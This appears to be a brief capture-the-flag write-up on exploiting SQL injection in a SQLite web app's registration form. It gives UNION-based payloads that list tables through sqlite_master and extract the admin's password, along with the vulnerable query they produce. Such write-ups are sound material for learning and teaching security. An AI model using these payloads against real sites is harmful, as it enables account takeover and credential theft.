hint: sqlite

what's injectable? tried to bypass form login, but that operation does
not require union, so not the right approach.

tried registering with `admin' or ''='` and logged in as that user,
noticed that the displayed posts were funky, so tried to attack the
registration form for user

error message when bad query: 

select id, user, post from posts where user = '
	test' union select user,password,3 from posts where user='admin
';

because sqlite, we know there is a table called sqlite_master, so we
can get the tables by the following:

	select name from sqlite_master where type='table';

we need to stick this in with the previous query, so we need to use
the union keyword, making sure we have the same number of columns

	select 1,2,name from ... etc.

this gives us the tables `users` and `posts`.

We can continue to guess the column names (user, pass), trying to get
the admin's password.

payload:

	x' union select 1, user, pass from users where user='admin

generates:

select id, user, post from posts where user='
	x' union select 1, user, pass from users where user='admin
';
